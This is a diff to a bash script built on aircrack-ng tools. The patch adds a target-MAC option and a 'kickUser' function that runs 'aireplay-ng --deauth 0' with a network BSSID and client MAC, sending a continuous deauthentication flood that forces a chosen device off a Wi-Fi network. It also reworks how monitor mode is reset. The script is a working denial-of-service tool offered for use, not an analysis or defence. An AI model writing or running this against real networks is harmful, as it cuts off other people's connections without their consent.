@@ -12,7 +12,7 @@ fi
 # Get arguments 
 # reset True > disable monitor mode befor exit
 # r and l without : coz thir is no input 
-while getopts "b:e:hrl:" option;
+while getopts "b:e:hrl:c:" option;
 do
     case $option in
         e) # set wiff essid
@@ -22,11 +22,14 @@ do
         r)
             reset=True;;
         h)
-            echo -e "-e for wifi essid\n-b for wifi bssid\n-r disable monitor mode\n-l list wifi"
+            echo -e "-e for wifi essid\n-b for wifi bssid\n-r disable monitor mode\n-l list wifi\n-c target mac address"
             ;;
         l)
             nmcli device wifi list ifname $OPTARG 
             exit
+            ;;
+        c)
+            targetMac=$OPTARG
             ;;
         \?) # unexpected arguments 
             echo -e "\n-e for wifi essid\n-b for wifi bssid "
@@ -69,10 +72,10 @@ function startMonitorMode {
 
 # stop monitor mode 
 function stopMonitorMode() {
-    sudo airmon-ng stop $1 > /dev/null 2>&1
+    interface=$(iw dev | grep Interface |cut -d " " -f2)
+    sudo airmon-ng stop $interface > /dev/null 2>&1
     echo seting MonitorMode off
     # Check if monitor mode is off
-    interface=$(iw dev | grep Interface |cut -d " " -f2)
     interfaceMode=$(iwconfig $interface |grep -o Monitor)
     # if monitor mode still enabled 
     # Try another way to stop it 
@@ -87,6 +90,13 @@ function stopMonitorMode() {
     
 }
 
+function resetMode(){
+    if [ $reset ]
+    then
+        stopMonitorMode 
+    fi
+
+}
 
 # Get mac list 
 function GetMacList() {
@@ -97,13 +107,15 @@ function GetMacList() {
     # grep the devices mac
     cat temp-01.csv | cut -d , -f 1 
     sudo rm -f temp*
-    if [ $reset ]
-    then
-        echo worked
-        stopMonitorMode $interfacee
-    fi
+    resetMode
 }
 
+
+# Kick user by mac address
+function kickUser(){
+    sudo aireplay-ng --deauth 0 -a $1 -c $2 $3
+    resetMode
+}
 
 
 
@@ -113,15 +125,23 @@ function GetMacList() {
 dpkg -s ${packgeNeeded[@]} > /dev/null 2>&1 || installAllPackages 
 
 # if the bessid is given 
-if [ ! -z $wifiBssid ]
+if [ ! -z $wifiBssid ] && [ -z $targetMac ]
 then
     # Start GetMacList function with essid option
     GetMacList "-d $wifiBssid"
+    echo "use -b essid -c TargeMac option to kick user"
     exit
 elif [ ! -z $wifiEssid ]
 then
     # Start GetMacList function with essid option
     GetMacList "--essid $wifiEssid"
+    echo "use -b essid -c TargeMac option to kick user"
+    exit
+elif [ ! -z $wifiBssid ] && [ ! -z $targetMac ]
+then
+    interfacee=$(startMonitorMode)
+    echo $interfacee is on Monitor Mode
+    kickUser $wifiBssid $targetMac $interfacee
     exit
 else
     echo "You Must Give Essid or bssid "
